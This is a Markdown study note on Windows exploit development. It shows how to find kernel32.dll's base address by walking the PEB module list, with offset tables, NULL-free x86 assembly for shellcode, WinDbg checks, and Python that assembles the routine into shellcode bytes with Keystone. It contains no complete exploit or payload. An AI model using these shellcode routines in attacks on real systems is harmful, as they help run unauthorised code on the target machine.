---
tags:
  - Advanced
  - Binary_Exploitation
  - Custom_Tools
  - Debugging
  - Exploitation
  - Windows
---

## Finding kernel32.dll Base Address
resources: [PEB Structure](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)

> Locate **kernel32.dll** in memory using the **PEB** method for reliable shellcode.

### PEB Method Overview [Knowledge]
> [!info] Walk the **InMemoryOrderModuleList** to find kernel32.dll:

```text
FS:[0x30] -> PEB
PEB + 0x0C -> Ldr (PEB_LDR_DATA)
Ldr + 0x14 -> InMemoryOrderModuleList
List entries contain DLL base addresses
```

### Module List Structure [Knowledge]
> Each entry in InMemoryOrderModuleList is LDR_DATA_TABLE_ENTRY.

```text
Entry + 0x00 = Flink (next entry)
Entry + 0x04 = Blink (previous entry)
Entry + 0x10 = DllBase (base address of module)
Entry + 0x28 = BaseDllName (UNICODE_STRING)
```

### Module Load Order [Knowledge]
> [!info] Modules appear in specific order in **InMemoryOrderModuleList**:
> 1. Executable itself (e.g., target.exe)
> 2. **ntdll.dll**
> 3. **kernel32.dll** (or **kernelbase.dll** on Windows 7+)

### Find kernel32.dll Assembly
> Assembly code to locate kernel32.dll base address.

```nasm
find_kernel32:
    xor ecx, ecx                ; ECX = 0
    mov eax, fs:[ecx + 0x30]    ; EAX = PEB address
    mov eax, [eax + 0x0c]       ; EAX = Ldr (PEB_LDR_DATA)
    mov esi, [eax + 0x14]       ; ESI = InMemoryOrderModuleList.Flink

next_module:
    mov ebx, [esi + 0x10]       ; EBX = DllBase
    mov edi, [esi + 0x28]       ; EDI = BaseDllName (UNICODE_STRING buffer)
    mov esi, [esi]              ; ESI = Next entry (Flink)
    cmp [edi + 12*2], cl        ; Check 13th char of name (NULL for kernel32)
    jne next_module             ; If not kernel32, continue

    ; EBX now contains kernel32.dll base address
```

### Alternative: Third Module Method
> Simply get the third module in the list (usually kernel32).

```nasm
find_kernel32_simple:
    xor ecx, ecx
    mov eax, fs:[ecx + 0x30]    ; PEB
    mov eax, [eax + 0x0c]       ; Ldr
    mov eax, [eax + 0x14]       ; InMemoryOrderModuleList (first = exe)
    mov eax, [eax]              ; Second entry (ntdll.dll)
    mov eax, [eax]              ; Third entry (kernel32.dll)
    mov eax, [eax + 0x10]       ; DllBase of kernel32.dll
```

### Verify in WinDbg
> Confirm the PEB structure and module list.

```text
0:000> dt ntdll!_PEB @$peb Ldr
0:000> dt ntdll!_PEB_LDR_DATA poi(@$peb+0xc)
0:000> !peb
0:000> lm m kernel32
```

### Walk Module List in WinDbg
> Manually walk the InMemoryOrderModuleList.

```text
; Get first entry
0:000> dd poi(poi(@$peb+0xc)+0x14)

; Get DllBase from entry
0:000> dd poi(poi(@$peb+0xc)+0x14)+0x10 L1
```

### Complete PEB Method (NULL-Free)
> Production-ready assembly.

```nasm
find_kernel32:
    xor ecx, ecx                ; Zero ECX
    mul ecx                     ; Zero EAX and EDX
    mov eax, fs:[ecx + 0x30]    ; EAX = &PEB
    mov eax, [eax + 0x0c]       ; EAX = PEB->Ldr
    mov esi, [eax + 0x14]       ; ESI = Ldr->InMemoryOrderModuleList.Flink
    lodsd                       ; EAX = Second entry (ntdll.dll)
    xchg eax, esi               ; ESI = Second entry
    lodsd                       ; EAX = Third entry (kernel32.dll)
    mov ebx, [eax + 0x10]       ; EBX = kernel32.dll base address
```

### Assemble with Keystone
> Convert assembly to shellcode bytes using the **Keystone** engine.

```python
from keystone import *

ks = Ks(KS_ARCH_X86, KS_MODE_32)

code = """
    xor ecx, ecx
    mul ecx
    mov eax, fs:[ecx + 0x30]
    mov eax, [eax + 0x0c]
    mov esi, [eax + 0x14]
    lodsd
    xchg eax, esi
    lodsd
    mov ebx, [eax + 0x10]
"""

encoding, count = ks.asm(code)
shellcode = bytes(encoding)
print(f"Shellcode ({len(shellcode)} bytes):")
print("".join(f"\\x{b:02x}" for b in shellcode))
```

### Check for NULL Bytes
> Verify shellcode is NULL-free.

```python
if b"\x00" in shellcode:
    print("WARNING: Contains NULL bytes!")
    for i, b in enumerate(shellcode):
        if b == 0:
            print(f"  NULL at offset {i}")
```

